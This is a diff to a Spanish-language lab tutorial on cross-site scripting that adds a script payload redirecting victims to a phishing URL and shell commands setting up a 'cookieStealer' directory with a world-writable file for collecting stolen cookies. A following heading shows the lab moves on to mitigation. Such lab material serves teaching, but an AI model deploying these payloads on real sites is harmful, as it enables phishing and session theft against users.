@@ -41,7 +41,21 @@ El navegador lo interpreta y muestra una ventana emergente:
 
 ![php1](./Imagenes/3.png)
 
+También podemos redirigir a una página de *Phishing* con el siguiente código:
 
+`<script>window.location='https://fakeupdate.net/win11/'</script>`
+
+![php1](./Imagenes/4.png)
+
+Ahora vamos a crearnos un fichero en nuestro servicio web para que se almacenen las *coookies* de los usuarios:
+
+```
+mkdir /var/www/html/cookieStealer/
+touch /var/www/html/cookieStealer/index.php
+touch /var/www/html/cookieStealer/cookies.txt
+chmod 777 /var/www/html/cookieStealer/cookies.txt
+```
+Y en el fichero ***index.php*** introducimos el código de [Este archivo](./Recursos/index.php)
 
 ## 3. Implementar modificaciones al código para mitigar los ataques XSS
 
